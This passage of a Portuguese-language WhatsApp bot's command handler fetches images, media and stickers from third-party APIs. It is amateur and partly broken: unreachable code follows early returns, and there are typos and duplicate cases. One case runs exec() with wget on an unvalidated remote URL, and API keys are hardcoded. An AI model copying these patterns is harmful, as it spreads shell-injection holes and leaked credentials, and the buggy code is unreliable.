nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { contextInfo: null, quoted: tomio, contextInfo: tome})

break
case 'wolf':  
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
F = body.slice(6)
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await getBuffer(`https://api.zeks.xyz/api/wolflogo?apikey=TioTomioka&text1=rimurubotz&text2=${F}`)
tomioka.sendMessage(from, anu, image, {caption: `Aqui est√° üòä`, quoted: msg})
break    
case 'ytsearch':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
if (args.length < 1) return enviar ('Tolong masukan query!')

const srch = args[0];

try {

var aramas = await yts(srch);

} catch {

return await tomioka.sendMessage(from, 'Error!', MessageType.text,)

}

aramat = aramas.all 

var tbuff = await getBuffer(aramat[0].image)

var ytresult = '';

ytresult += '„Äå *YOUTUBE* „Äç'

ytresult += '\n________________________\n\n'

aramas.all.map((video) => {

ytresult += '‚ùè Titulo: ' + video.title + '\n'

ytresult += '‚ùè Link: ' + video.url + '\n________________________\n\n'

});

ytresult += '‚ó© *Tomioka-self*'

await tomioka.sendMessage(from, tbuff, image, {thumbnail: fs.readFileSync('./assets/foto.png'),quoted: msg, caption: ytresult})


break
case 'textblue':
if (args.length < 1) return enviar (mess.blank)
tels = body.slice(9)
if (tels.ength > 10) return enviar ('O texto √© longo, at√© 9 caracteres')
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson(`http://melodicxt.herokuapp.com/api/txtcustom?theme=blue_metal&text=${tels}&apiKey=administrator`, {method: 'get'})
buff = await getBuffer(anu.result)
tomioka.sendMessage(from, buff, image, {quoted: msg})
break
case 'rize':
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson(`https://imgur.com/gallery/s1ecUj8`, {method: 'get'})
ri = JSON.parse(JSON.stringify(anu));
ze =  ri[Math.floor(Math.random() * ri.length)];
nye = await getBuffer(ze)
tomioka.sendMessage(from, nye, image, { caption: 'rize chan!!', contextInfo: null, quoted: tomio, contextInfo: tome})

break 
case 'mia':
if (!isNsfw) return enviar (' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson(`https://testesw.herokuapp.com/`, {method: 'get'})
ri = JSON.parse(JSON.stringify(anu));
ze =  ri[Math.floor(Math.random() * ri.length)];
nye = await getBuffer(ze)
tomioka.sendMessage(from, nye, image, { caption: 'i love you, mia ü•∫‚ù§Ô∏è', contextInfo: null, quoted: tomio, contextInfo: tome})

break 
case 'qrcode':
if (!isPremium) return enviar ('s√≥ premium')

const tex = encodeURIComponent(body.slice(8))
if (!tex) return tomioka.sendMessage(from, 'Digite um texto/url que deseja criar um c√≥digo qr', text, {quoted: msg})
const bufferr = await getBuffer(`https://api.qrserver.com/v1/createSticker-qr-code/?size=500x500&data=${tex}`)
tomioka.sendMessage(from, bufferr, image, {quoted: msg})
break
case 'texteng':
if (args.length < 1) return enviar (mess.blank)
tels = body.slice(9)
if (tels.ength > 10) return enviar ('O texto √© longo, at√© 9 caracteres')
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson(`http://melodicxt.herokuapp.com/api/txtcustom?theme=sand_engraved&text=${tels}&apiKey=administrator`, {method: 'get'})
buff = await getBuffer(anu.result)
tomioka.sendMessage(from, buff, image, {quoted: msg})
break

case 'brainly':
brien = body.slice(9)
brainly(`${brien}`).then(res => {
teks = '‚ô°‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ô°\n'
for (let Y of res.data) {
teks += `\n*„Äå BRAINLY „Äç*\n\n*‚û∏ Quest√£o:* ${Y.pertanyaan}\n\n*‚û∏ Resposta:* ${Y.jawaban[0].text}\n‚ô°‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ô°\n`
}
tomioka.sendMessage(from, teks, text, {quoted: msg, detectLinks: false})
console.log(res)
})

break
case 'premiumlist':
teks = '‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ*„Äå *USU√ÅRIOS PREMIUMüëë* „Äç\n'
for (let V of premium) {
teks += `‚îÇ+  @${V.split('@')[0]}\n`
}
teks += `‚îÇ+ Total : ${premium.length}\n‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ*„Äå *TOMIOKA BOT* „Äç`
tomioka.sendMessage(from, teks.trim(), extendedText, {quoted: msg, contextInfo: {"mentionedJid": premium}})
break
/*     case 'qrcode':
if (!isPremium) return enviar ('s√≥ premium')
const tex = encodeURIComponent(body.slice(8))
if (!tex) return tomioka.sendMessage(from, 'Digite um texto/url que deseja criar um c√≥digo qr', text, {quoted: msg})
const bufferr = await getBuffer(`https://api.qrserver.com/v1/createSticker-qr-code/?size=500x500&data=${tex}`)
tomioka.sendMessage(from, bufferr, image, {quoted: msg})
break*/
case 'wa.me':
case 'wame':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.updatePresence(from, Presence.composing) 
options = {
text: `„Äå *LINK WHATSAPP* „Äç\n\n_Solicitado por_ : *@${sender.split("@s.whatsapp.net")[0]}*\n\nSeu link WhatsApp:\n\n*https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n\n*Ou*\n\n*https://api.whatsapp.com/send?phone=${sender.split("@")[0]}*\n\n*_TOMIOKABOT_*`,
contextInfo: { mentionedJid: [sender] }
}
tomioka.sendMessage(from, options, text, { contextInfo: null, quoted: tomio, contextInfo: tome} )
break
case 'playstore':
ps = `${body.slice(11)}`
anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/playstore?q=${ps}`, {method: 'get'})
store = '======================\n'
for (let ply of anu.result){
store += `‚Ä¢ *Nome Apk:* ${ply.app.name}\n‚Ä¢ *ID:* ${ply.app.id}\n‚Ä¢ *Link Apk:* ${ply.app.url}\n===================¬∞]\n`
}
enviar(store.trim())
break
/*   case 'pornhub':
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
if (args.length < 1) return enviar ('Cad√™ o texto, mano?')
teks = body.slice(9)
anu = await fetchJson(`https://api.arugaz.my.id/api/media/pornhub/search?query=${teks}`, {method: 'get'})
teks = `===============\n`
for (let bokep of anu.result) {
teks += `T√≠tulo: ${bokep.title}\nAtor: ${bokep.author}\nVisualizadores: *${bokep.views}*\nDura√ß√£o: ${bokep.duration}\nLink: ${bokep.link}\n===============\n`
}
enviar(teks.trim())

break  */
case 'nekopoi':
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
if (args.length < 1) return enviar ('Cad√™ o texto, mano?')
teks = body.slice(9)
anu = await fetchJson(`https://api.vhtear.com/nekosearch?query=${teks}&apikey=${VthearApi}`, {method: 'get'})
teks = `===============\n`
for (let neko of anu.result) {
teks += `T√≠tulo: ${neko.title}\nDescri√ß√£o: ${neko.detail}\n===============\n`
}
enviar(teks.trim())

break  
case 'xvideos':
if (args.length < 1) return enviar ('Cad√™ o texto, mano?')
anu = await fetchJson(`https://api.arugaz.my.id/api/media/xvideo/search?query=${body.slice(9)}`, {method: 'get'})
teks = `===============\n`
for (let b of anu.result) {
teks += `‚Ä¢ T√≠tulo: ${b.title}\n‚Ä¢ Info: ${b.info}\n‚Ä¢ Link: ${b.link}\n===============\n`
}
enviar(teks.trim())

break 
case 'onichan':
case 'bodoh':
tomioka.sendMessage(from, buff, './lindy/baka.mp3', audio/mp3, {quoted: msg, ptt:true})
break
case 'hunti':
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson(`https://api.vhtear.com/nhentaipdfdownload?query=287167&apikey={BELI APIKEY BIAR WORK DI 0816546638}`, {method: 'get'})
if (anu.error) return enviar (anu.error)
bufferjj = await getBuffer(anu.result.pdf_file)
tomioka.sendMessage(from, bufferjj, document, {mimetype: 'document/pdf', quoted: msg})
break
case 'setdesc':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
tomioka.groupUpdateDescription(from, `${body.slice(9)}`)
tomioka.sendMessage(from, 'Descri√ß√£o alterada com sucesso', text, {quoted: msg})
break
case 'speed':
case 'ping':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
const timestamp = speed();
const latensi = speed() - timestamp
tomioka.updatePresence(from, Presence.composing) 
uptime = process.uptime()
tomioka.sendMessage(from, 
`SPEED: *${latensi.toFixed(4)} _SEGUNDO_*
*O BOT ESTEVE ATIVO POR*
*${kyun(uptime)}*`, text, { quoted: tomio, contextInfo: tome})
break
case 'delete':
case 'del':
case 'd':  
if (!isPremium) return enviar ('s√≥ premium')
tomioka.deleteMessage(from, { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
break
case 'playmp3':
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
play = body.slice(9)
anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?q=${play}&apikey=${ZeksApi}`, {method: 'get'})
if (anu.error) return enviar (anu.error)
infomp3 = `„Äå *TIMELINE PLAY MP3* „Äç\n*‚Ä¢ T√≠tulo:* ${anu.result.title}\n*‚Ä¢ Link:* ${anu.result.source}\n*‚Ä¢ Tamanho:* ${anu.result.size}\n\n*ESPERE NOVAMENTE ENVIANDO POR FAVOR, N√ÉO SPAME O CHAT*`
buffer = await getBuffer(anu.result.thumbnail)
lagu = await getBuffer(anu.result.url_audio)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: infomp3})
tomioka.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: msg})

break 
case 'smule':
if (args.length < 1) return enviar ('Cad√™ o url mano?')
if (!isUrl(args[0]) && !args[0].includes('c-ash.smule')) return enviar (mess.error.Iv)
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson(`https://mnazria.herokuapp.com/api/smule?link=${args[0]}`, {method: 'get'})
if (anu.error) return enviar (anu.error)
teks = `*T√≠tulo* : ${anu.title}\n\n Espere 1 minuto, talvez um pouco mais porque o download de v√≠deos esta executando`
thumb = await getBuffer(anu.thumb)
tomioka.sendMessage(from, thumb, image, {quoted: msg, caption: teks})
buffer = await getBuffer(anu.result)
tomioka.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: msg, caption: 'Aqui mano'})

break  
case 'donate': case 'doar':
console.log(color('[DOAR]', 'blue'), color(`DOA√áAO ATIVADA!`, 'pink'))
donate = `Incentive meu criador fazendo uma doa√ß√£o via pix:\n`
donate2 = `aa204cca-88cd-47c9-8727-1d335c55aa93`
tomioka.sendMessage(from, donate, text, {quoted: tomio, contextInfo: tome})
tomioka.sendMessage(from, donate2, text, {quoted: tomio, contextInfo: tome})
break 
case 'desbloquear':
if (!isGroup) return enviar ('s√≥ grupo')
if (!isOwner) return enviar (mess.only.ownerB)
tomioka.blockUser (`${body.slice(9)}@c.us`, "remove")
tomioka.sendMessage(from, `perintah Diterima, membuka blokir ${body.slice(9)}@c.us`, text)
break
case 'bloquear':
tomioka.updatePresence(from, Presence.composing) 
tomioka.chatRead (from)
if (!isGroup) return enviar ('s√≥ grupo')
if (!isOwner) return enviar (mess.only.ownerB)
tomioka.blockUser (`${body.slice(7)}@c.us`, "add")
tomioka.sendMessage(from, `ESTE COMANDO N√ÉO EST√Å FUNCIONANDO, EM BREVE SER√Å CORRIGIDO ${body.slice(7)}@c.us`, text)
break
case 'image':
if (args.length < 1) return enviar ('O que voc√™ quer procurar, mana?')
goo = body.slice(7)
anu = await fetchJson(`https://api.vhtear.com/googleimg?query=${goo}&apikey=ANTIGRATISNIHANJENKKK`, {method: 'get'})
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
var pol = JSON.parse(JSON.stringify(anu.result.result_search));
var tes2 =  pol[Math.floor(Math.random() * pol.length)];
pint = await getBuffer(tes2)
tomioka.sendMessage(from, pint, image, { caption: '*Google Image*\n\n*Resultado da pesquisa : '+goo+'*', contextInfo: null, quoted: tomio, contextInfo: tome})
break
/*        case '.':
goo = body.slice(2)
anu = await fetchJson(`https://api.vhtear.com/googleimg?query=${goo}&apikey=ANTIGRATISNIHANJENKKK`, {method: 'get'})
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
var pol = JSON.parse(JSON.stringify(anu.result.result_search));
var tes2 =  pol[Math.floor(Math.random() * pol.length)];
pint = await getBuffer(tes2)
tomioka.sendMessage(from, pint, image, { caption: '*Google Image*\n\n*Resultado da pesquisa : '+goo+'*', contextInfo: null, quoted: tomio, contextInfo: tome})
break  */
case '.':
tels = body.slice(2)
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://api.fdci.se/rep.php?gambar=${tels}`, {method: 'get'})
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { quoted: msg, caption: `*PINTEREST*\n\*Resultado da pesquisa* : *${tels}*`})

break
case 'playstore':
kuji = body.slice(7)
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await getBuffer(`https://api.vhtear.com/playstore?query={kuji}&apikey=Aris komtol`, {method: 'get'})
capty = `*‚û∏ title :* ${anu.title}\n*‚û∏ app_id :* ${anu.app_id}\n*‚û∏ description :* ${anu.description}\n*‚û∏ developer_id :* ${anu.developer_id}\n*‚û∏ developer :* ${anu.developer}\n*‚û∏ score :* ${anu.score}\n*‚û∏ full_price :* ${anu.full_price}\n*‚û∏ price :* ${anu.price}\n*‚û∏ free :* ${anu.free}`
tomioka.sendMessage(from, anu, image, {quoted: msg, caption: capty})
break
case 'otagall2':
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `*üòò* ${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
break
case 'pinterest':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tels = body.slice(11)
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=${tels}`, {method: 'get'})
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { quoted: msg, caption: `*PINTEREST*\n\*Resultado da pesquisa* : *${tels}*`})

break
case 'anime':

tomioka.updatePresence(from, Presence.composing)
am = ["anime tumblr",
"wallpaper anime hd",
"anime aestethic",
"anime hd"
]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
enviar(ptbr.wait())
n = JSON.parse(JSON.stringify(data));
nimsg = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, {
quoted: msg,
caption: `üíÆ`
})
break
//_PESQUISA ESPEC√çFICA DE FOTO 
case 'naruto':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tels = body.slice(11)
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=naruto`, {method: 'get'})
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { quoted: msg, caption: '*naruto uzumikin*'})

break
case 'sakura':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tels = body.slice(11)
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=sakura`, {method: 'get'})
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { quoted: msg, caption: '*sakura*'})

break
case 'saske':
case 'sasuke':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tels = body.slice(11)
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=sasuke`, {method: 'get'})
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { quoted: msg, caption: '*saske*'})

break
case 'hinata':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tels = body.slice(11)
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=hinata`, {method: 'get'})
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { quoted: msg, caption: '*hinata*'})

break
case 'tomioka':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tels = body.slice(11)
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=gyutomioka`, {method: 'get'})
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { quoted: msg, caption: '*tomioka*'})

break
case 'stalkgithub':
case 'githubstalk':     ////tomioka
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} ivan18274737373`)
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..') 
username = args[0]
ini_result = await fetchJson(`https://api-gdr2.herokuapp.com/api/github?username=${username}`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.avatar_url)
ini_txt = `‚îè‚îâ‚å£ ‚îàÃ•-Ã∂ÃØÕ°..Ã∑Ã¥‚úΩÃ∂‚îÑ‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îâ‚îì
‚îÜ *USU√ÅRIO DO GITHUB* 
‚îî‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚å£ ‚îàÃ•-Ã∂ÃØÕ°..Ã∑Ã¥‚úΩÃ∂‚å£ ‚úΩÃ∂

*Dados obtidos com sucesso!*
\`\`\`‚ñ¢ id : ${ini_result.id}\`\`\`
\`\`\`‚ñ¢ node_id : ${ini_result.node_id}\`\`\`
\`\`\`‚ñ¢ Nome de usu√°rio : ${ini_result.name}\`\`\`
\`\`\`‚ñ¢ Repo p√∫blico : ${ini_result.public_repos}\`\`\`
\`\`\`‚ñ¢ S√≠ntese p√∫blica: ${ini_result.public_gists}\`\`\`
\`\`\`‚ñ¢ Seguidor : ${ini_result.followers}\`\`\`
\`\`\`‚ñ¢ Seguindo : ${ini_result.following}\`\`\`
\`\`\`‚ñ¢ Seguir : ${ini_result.bio}\`\`\`
\`\`\`‚ñ¢ Link : ${ini_result.html_url}\`\`\`
\`\`\`‚ñ¢ criador : ${ini_result.createStickerd_at}\`\`\`
\`\`\`‚ñ¢ upado : ${ini_result.updated_at}\`\`\`
`
tomioka.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
break
case 'cringe':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
data = fs.readFileSync('./src/tomiokajokes.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasil = await getBuffer(randKey.result)
sendImage(hasil, msg, '*Boo :V*')
break
case 'alerta':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
data = fs.readFileSync('./src/alerta.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasil = await getBuffer(randKey.result)
sendImage(hasil, msg, '*alerta :V*')
break
case 'vanitas':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
data = fs.readFileSync('./src/alerta1.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasil = await getBuffer(randKey.result)
sendImage(hasil, msg, '*vanitas :V*')
break
case 'fogos':                   
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(6)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://api.zeks.xyz/api/tfire?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'ta ai'})
break			
case 'summer':      
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(7)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://api.zeks.xyz/api/sandw?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'ta ai'})
break
case 'path':          
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(5)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://api.zeks.xyz/api/crismes?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'ta ai'})
break
case 'moddroid':
data = await fetchJson(`https://tobz-api.herokuapp.com/api/moddroid?q=${body.slice(10)}&apikey=${TobzApi}`)
hepi = data.result[0] 
teks = `*Nome*: ${data.result[0].title}\n*editor*: ${hepi.publisher}\n*mod info:* ${hepi.mod_info}\n*Tamanho*: ${hepi.size}\n*√∫ltima vers√£o*: ${hepi.latest_version}\n*g√™nero*: ${hepi.genre}\n*link:* ${hepi.link}\n*download*: ${hepi.download}`
buffer = await getBuffer(hepi.image)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: `${teks}`})

break
case 'happymod':
data = await fetchJson(`https://tobz-api.herokuapp.com/api/happymod?q=${body.slice(10)}&apikey=${TobzApi}`)
hupo = data.result[0] 
teks = `*Nome*: ${data.result[0].title}\n*vers√£o*: ${hupo.version}\n*Tamanho:* ${hupo.size}\n*root*: ${hupo.root}\n*compra*: ${hupo.price}\n*link*: ${hupo.link}\n*download*: ${hupo.download}`
buffer = await getBuffer(hupo.image)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: `${teks}`})

break
case 'nsfwboquete':

return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob}`, {method: 'get'})
naru = JSON.parse(JSON.stringify(anu));
to =  naru[Math.floor(Math.random() * naru.length)];
nye = await getBuffer(to)
tomioka.sendMessage(from, nye, image, { caption: 'naruto!!', contextInfo: null, quoted: tomio, contextInfo: tome})

break 
case 'resetlink':
if (!isBotGroupAdmins) return enviar(`O BOT PRECISA SER ADM`)
if (!isGroup) return enviar(`S√ì EM GRUPO`)
if (!isGroupAdmins) return enviar(`PRECISA SER ADMININASTROR`)
tomioka.query({ json: ['action', 'inviteReset', from], expect200: true })
linkgc = await tomioka.groupInviteCode(from)
enviar('link resetado com sucesso! Grupo de links novo https://chat.whatsapp.com/'+linkgc)
break
case 'animecry':
cry = getRandom('.gif')
rano = getRandom('.webp')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/cry?apikey=${TobzApi}`, {method: 'get'})
if (!isGroup) return enviar ('s√≥ grupo')
enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(cry)
buffer = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer, sticker, {quoted: msg})
fs.unlinkSync(rano)
})

break 
case 'onich':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/sound7.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'ola':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/ola.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'bv':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/bv.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'tchau':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/tchau.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'bem':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/bem.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'banoit':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/banoit.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'batarde':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/batarde.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'bodia':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/bodia.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'a':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/a.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'beat1':
